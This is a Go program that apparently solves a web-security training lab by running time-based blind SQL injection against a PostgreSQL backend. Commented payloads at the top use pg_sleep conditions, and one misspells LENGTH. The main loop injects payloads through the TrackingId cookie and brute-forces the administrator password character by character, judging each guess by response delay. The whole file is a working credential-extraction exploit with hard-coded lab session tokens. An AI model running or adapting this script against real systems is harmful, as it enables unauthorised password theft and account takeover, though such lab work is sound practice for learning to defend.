package main

//x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
//x';SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator') > 0) THEN pg_sleep(10) ELSE pg_sleep(0) END--
//x';SELECT CASE WHEN ((SELECT LENGHT(password) FROM users WHERE username='administrator') = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END--
//x';SELECT CASE WHEN ((SELECT SUBSTRING(1,1) FROM users WHERE username='administrator') = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END--
//x'%3bSELECT+CASE+WHEN+((SELECT+SUBSTRING(1,1)+FROM+users+WHERE+username%3d'administrator')+%3d+'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"time"
)

var (
	url_       = "https://aca81f351e13ba21c0918120007d00b8.web-security-academy.net/"
	keylist    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	TrackingId = "VMW0DBX21jdazb9j"
	session    = "DkP9rL8McIPy13pFZ4lbzoU66Oaizav4"
)

func main() {
	pentest()
}

func pentest() {

	pass := ""
	for ok := true; ok; ok = (len(pass) != 20) {
		for _, c := range keylist {
			res := sendReq("x';SELECT CASE WHEN ((SELECT SUBSTRING(password,1," + strconv.Itoa((len(pass) + 1)) + ") FROM users WHERE username='administrator') = '" + pass + string(c) + "') THEN pg_sleep(10) ELSE pg_sleep(0) END--")
			if res {
				pass += string(c)
				fmt.Println("Success : " + pass)
				break
			}
		}
	}
}

func sendReq(payload string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url_, nil)

	req.Header.Add("Cookie", "TrackingId="+url.QueryEscape(payload)+";session="+session)
	start := time.Now()
	_, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	elapsed := time.Since(start).Seconds()

	fmt.Println(payload)
	fmt.Println(elapsed)

	return elapsed > 10

}
